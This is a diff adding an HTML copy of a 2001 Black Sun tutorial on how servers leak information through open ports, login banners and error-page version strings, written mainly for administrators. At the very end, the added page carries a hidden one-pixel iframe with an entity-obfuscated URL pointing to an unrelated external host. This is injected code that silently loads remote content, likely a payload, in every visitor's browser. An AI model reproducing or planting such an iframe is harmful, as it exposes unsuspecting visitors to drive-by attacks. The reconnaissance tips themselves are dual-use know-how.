@@ -1,0 +1,140 @@
+<htlml>
+<head>
+<Title>Black SUn Research Facility - Info Gathering Tutorial</title>
+</head>
+<body>
+<pre><font size=2>
+
+
+                        :::::::::   ::::::::  :::::::::  :::::::::: 
+                        :+:    :+: :+:    :+: :+:    :+: :+:        
+                        +:+    +:+ +:+        +:+    +:+ +:+        
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                        +#+    +#+        +#+ +#+    +#+ +#+        
+                        #+#    #+# #+#    #+# #+#    #+# #+#        
+                        #########   ########  ###    ### ###  
+                         
+              	             http://blacksun.box.sk
+                           _____________________________
+    ______________________I          Topic:             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I   Possible Information      I   Written by:     /
+    /                     I    leaks on servers         I                   \ 
+   /   Digital Fallout    I_____________________________I  Digital Fallout   \
+  /___________________________>Version 2.0, 10/13/2001<________________________\
+
+
+
+What's New In This Version -
+
+This is a near-complete re-write of Raven's original "info gathering tutorial" 
+previously hosted on BSRF. It contains some of the original text from version
+  1.8 I hope to make it more up to date, more accurate, and generally more 
+useful to both computer novices and experienced server administrators.  
+Although the original (before this version) was based on how to gather 
+information about a specific user, this version will be focused on a server 
+based platform. 
+
+Opining Notes -
+
+This paper is so you (the reader) is aware if some of the possible ways that 
+you can learn about a server, what operating system it is running along with
+ services (daemons), and possibly more importantly, so you cam be aware of 
+possible security risks so you may take measures to fix them. 
+
+
+Section 1 - The Port Scan
+
+The port scanner, one of the most basic network tools out there. You as the 
+admin should have one (preferable nmap, the de facto port scanner) because 
+you can be sure that your possible attackers have them  The port scanner 
+works by connection to every port (or selected ports) on your server to see 
+wither or not it is accepting connections.  Depending what port is 
+accepting the connection, it can be reasonably assumed that a specific 
+service is running. For example, if you run a port scan on a server and 
+find that port 80 is open, you can assume that this particular server is 
+running an HTTP server. Please note that these are only default ports. It 
+is quite possible to have an HTTP server running on port 91 or even 4503! 
+But for the purpose of this paper, we will assume that the default ports 
+are being used.
+
+The Following is a list of common ports for specific services. For a 
+complete list you may look at any number of other references or look at 
+the "services" file in your /etc directory on a UNIX based system. 
+
+
+
+Port
+
+21     FTP
+22     SSH
+23     Telnet
+25     SMTP
+79     Finger
+80     HTTP
+110    POP3
+
+
+
+Section 2- Default Banners
+
+What is a banner? A banner is that thing you see when you try to telnet 
+into a computer. For example this is the default banner to a  Linux Mandrake
+version 6.1 computer
+
+Linux Mandrake release 6.1 (Helios)
+Kernel 2.2.13-4mdksmp on an i686
+login:
+          
+
+What information do we see here? Well it is rather obvious. First off we 
+know that this is a Linux operating system running the 2.2.13 kernel. We 
+know that it is running the Mandrake Linux distribution, and we also know 
+the architecture of the server (i686i). This is way more information that 
+you would want any attacker to know. At this point the user could simply go 
+to one of possibly hundreds of exploit sites and simply download a pre-made 
+program and hack into your computer with little skill at all. 
+
+Some other things you may wish to change on your computer to further hide 
+information are the MOTD files in your /etc directory, and one of the most
+overlooked file, is the COPYRIGHT files that got installed with your 
+system, they to usually contain information about your server. Keep in 
+mind that by using the uname command, allot of this can be bypassed but 
+restrictions to that command should also be set. 
+
+
+
+
+Section 3- Error Messages
+
+Finally one of the major things you need to watch out for are error 
+messages. By purposely not following expected procedure, a potential 
+attacker can gain information. One of the most common errors  is the 
+404 error. This error message is generated when an HTTP server is given a 
+request for a file that does not exist.  However in the default page 
+displayed when you get the error, you can look to the bottom of the page 
+and find the version number of the server. This is usually harmless 
+information by itself but it is still information that could assist a 
+possible attacker. 
+
+
+
+Closing Notes-
+
+I hope this basic paper gave you some information on the possible ways 
+you may accidentally broadcasting information about your server. Please 
+note that this is by far not a complete list but it does show the three 
+main ways information is gained about servers. Please visit 
+Http://blacksun.box.sk for more information about computers and the 
+internet
+
+Useful links
+
+http://blacksun.box.sk   <-- BSRF Homepage
+</pre>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
+
+
+
